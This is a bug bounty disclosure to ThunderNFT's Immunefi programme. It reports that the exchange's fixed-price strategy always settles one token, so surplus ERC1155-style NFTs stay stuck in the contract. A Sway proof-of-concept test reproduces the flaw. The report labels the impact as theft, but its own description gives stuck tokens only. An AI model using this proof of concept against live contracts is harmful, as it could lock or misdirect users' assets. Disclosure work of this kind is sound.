# IOP \_ ThunderNFT 34957 - \[Smart Contract - Critical] executionResults always returns an amount of le

Submitted on Sun Sep 01 2024 20:02:08 GMT-0400 (Atlantic Standard Time) by @SimaoAmaro for [IOP | ThunderNFT](https://immunefi.com/bounty/thundernft-iop/)

Report ID: #34957

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/ThunderFuel/smart-contracts/tree/main/contracts-v1/libraries>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

Executed orders always transfer 1 nft to the taker, when the maker order may have deposited more than 1 amount of the given collection and token id nft to the `ThunderExchange`.

## Vulnerability Details

When executing orders in `ThunderExchange::executeOrder()`, it gets the result of the execution from the picked strategy, `strategy_fixed_price_sale` in this case, more precisely from `ExecutionResult::s1()`, which always returns an amount of `1`.

However, orders may be place with an amount bigger than 1 as the `ThunderExchange` supports erc1155 style nfts. Thus, The following scenario will happen:

1. User places an order of a certain erc1155 style nft with an amount bigger than 1.
2. Another user executes the order, but only receives 1 nft, instead of the whole amount in the order. The remaining nfts get stuck in the `ThunderExchange`.

## Impact Details

Stuck nfts in the `ThunderExchange`.

## References

<https://github.com/ThunderFuel/smart-contracts/blob/main/contracts-v1/libraries/src/execution\\_result.sw#L31>

## Proof of concept

## Proof of Concept

To run a proof of concept, the exchange was modified to allow a maker of type Contract, as Sway tests do not support pranking an EOA.

Additionally, 3 new contracts were created, one user contract simulating a user placing an order, another user contract simulating a user executing the order and a erc1155 contract, simulating an erc1155 token.

The full changes were pushed to a github repository which can be shared with the team if requested.

The main test file is the following:

```sway
contract;

 use interfaces::{
    thunder_exchange_interface::{ThunderExchange},
    royalty_manager_interface::*,
    asset_manager_interface::*,
    execution_manager_interface::ExecutionManager,
    execution_strategy_interface::*,
    pool_interface::Pool,
};

use libraries::{
    msg_sender_address::*,
    constants::*,
    order_types::*,
    ownable::*,
};

use std::{
    block::timestamp,
    auth::*,
    call_frames::*,
    context::*,
    contract_id::ContractId,
    logging::log,
    revert::require,
    storage::storage_map::*,
    asset::*
};

abi Erc1155 {
    #[storage(read, write)]
    fn constructor(owner: Identity);

    #[storage(read, write)]
    fn mint(recipient: Identity, sub_id: SubId, amount: u64);

    #[payable]
    #[storage(read, write)]
    fn burn(sub_id: SubId, amount: u64);
}

abi User {
    fn place_order(thunder_exchange_contract: ContractId, maker_order_input: MakerOrderInput);
    fn execute_order(thunder_exchange_contract: ContractId, order: TakerOrder, payment_asset: AssetId);
}

#[test()]
fn test_attack() {
    initialize_functions();

    call_attack();
}

fn initialize_functions() {
    //initialize all contracts 

    let thunder_exch = abi(ThunderExchange, thunder_exchange::CONTRACT_ID);
    thunder_exch.initialize();

    let asset_mngr = abi(AssetManager, asset_manager::CONTRACT_ID);
    asset_mngr.initialize();

    // required for initialize below contracts
    let exchange_contract_id = ContractId::from(thunder_exchange::CONTRACT_ID);

    let asset_manger_contract_id = ContractId::from(asset_manager::CONTRACT_ID);

    let fixed_strategy = abi(ExecutionStrategy, strategy_fixed_price_sale::CONTRACT_ID);
    fixed_strategy.initialize(exchange_contract_id);

    let execution_manager = abi(ExecutionManager, execution_manager::CONTRACT_ID);
    execution_manager.initialize();

    let royalty_manager = abi(RoyaltyManager, royalty_manager::CONTRACT_ID);
    royalty_manager.initialize();

    let pool = abi(Pool, pool::CONTRACT_ID);
    pool.initialize(exchange_contract_id, asset_manger_contract_id);

    let erc1155 = abi(Erc1155, erc1155::CONTRACT_ID);
    erc1155.constructor(Identity::ContractId(ContractId::this()));

    let execution_manager = abi(ExecutionManager, execution_manager::CONTRACT_ID);
    execution_manager.add_strategy(ContractId::from(strategy_fixed_price_sale::CONTRACT_ID));

    let asset_manager = abi(AssetManager, asset_manager::CONTRACT_ID);
    asset_manager.add_asset(AssetId::new(ContractId::from(erc1155::CONTRACT_ID), SubId::zero()));

    thunder_exch.set_execution_manager(ContractId::from(execution_manager::CONTRACT_ID));
    thunder_exch.set_asset_manager(ContractId::from(asset_manager::CONTRACT_ID));
    thunder_exch.set_royalty_manager(ContractId::from(royalty_manager::CONTRACT_ID));
}

fn call_attack() {
    let thunder_exchange = ContractId::from(thunder_exchange::CONTRACT_ID);
    let strategy = ContractId::from(strategy_fixed_price_sale::CONTRACT_ID);

    let user = abi(User, user::CONTRACT_ID);

    let erc1155 = abi(Erc1155, erc1155::CONTRACT_ID);
    let sub_id = 0x0000000000000000000000000000000000000000000000000000000000000001;

    erc1155.mint(Identity::ContractId(ContractId::from(user::CONTRACT_ID)), sub_id, 2);

    let payment_asset = AssetId::new(ContractId::from(erc1155::CONTRACT_ID), SubId::zero());
    let erc1155_asset = AssetId::new(ContractId::from(erc1155::CONTRACT_ID), sub_id);
    let erc1155_amount = 2;

    let maker_order = MakerOrderInput {
        side: Side::Sell,
        maker: Identity::ContractId(ContractId::from(user::CONTRACT_ID)),
        collection: ContractId::from(erc1155::CONTRACT_ID),
        token_id: sub_id,
        price: 1,
        amount: erc1155_amount,
        nonce: 1,
        strategy: strategy,
        payment_asset: payment_asset,
        expiration_range: 100,
        extra_params: ExtraParams {
            extra_address_param: Address::zero(),
            extra_contract_param: ContractId::zero(),
            extra_u64_param: 0,
        },
    };

    let user = abi(User, user::CONTRACT_ID);

    user.place_order(thunder_exchange, maker_order);

    let user2 = abi(User, user2::CONTRACT_ID);

    let taker_order = TakerOrder {
        side: Side::Buy,
        taker: Identity::ContractId(ContractId::from(user2::CONTRACT_ID)),
        maker: Identity::ContractId(ContractId::from(user::CONTRACT_ID)),
        nonce: 1,
        price: 1,
        token_id: sub_id,
        collection: ContractId::from(erc1155::CONTRACT_ID),
        strategy: strategy,
        extra_params: ExtraParams {
            extra_address_param: Address::zero(),
            extra_contract_param: ContractId::zero(),
            extra_u64_param: 0,
        },
    };

    erc1155.mint(Identity::ContractId(ContractId::from(user2::CONTRACT_ID)), SubId::zero(), 1);

    user2.execute_order(thunder_exchange, taker_order, payment_asset);

    assert(balance_of(ContractId::from(user2::CONTRACT_ID), erc1155_asset) == 1);
    assert(balance_of(thunder_exchange, erc1155_asset) == 1);
}
```

The user contract placing the order is:

```sway
contract;

use interfaces::{
    thunder_exchange_interface::{ThunderExchange},
};

use libraries::{
    order_types::*,
};

abi User {
    fn place_order(thunder_exchange_contract: ContractId, maker_order_input: MakerOrderInput);
}

impl User for Contract {
    fn place_order(thunder_exchange_contract: ContractId, maker_order_input: MakerOrderInput) {
        let thunder_exchange = abi(ThunderExchange, thunder_exchange_contract.into());
        let asset_id = AssetId::new(maker_order_input.collection, maker_order_input.token_id);
        thunder_exchange.place_order{asset_id: asset_id.bits(), coins: maker_order_input.amount}(maker_order_input);
    }
}
```

The user contract executing the order is:

```sway
contract;

use interfaces::{
    thunder_exchange_interface::{ThunderExchange},
};

use libraries::{
    order_types::*,
};

abi User {
    fn execute_order(thunder_exchange_contract: ContractId, order: TakerOrder, payment_asset: AssetId);
}

impl User for Contract {
    fn execute_order(thunder_exchange_contract: ContractId, order: TakerOrder, payment_asset: AssetId) {
        let thunder_exchange = abi(ThunderExchange, thunder_exchange_contract.into());
        thunder_exchange.execute_order{asset_id: payment_asset.bits(), coins: order.price}(order);
    }
}
```

The erc1155 is the same as the erc721, but the mint function had the checks removed to allow more than 1 coin per token id:

```sway
fn mint(recipient: Identity, sub_id: SubId, amount: u64) {
    require_not_paused();

    // Mint the ERC1155
    let _ = _mint(
        storage
            .total_assets,
        storage
            .total_supply,
        recipient,
        sub_id,
        amount,
    );
}
```
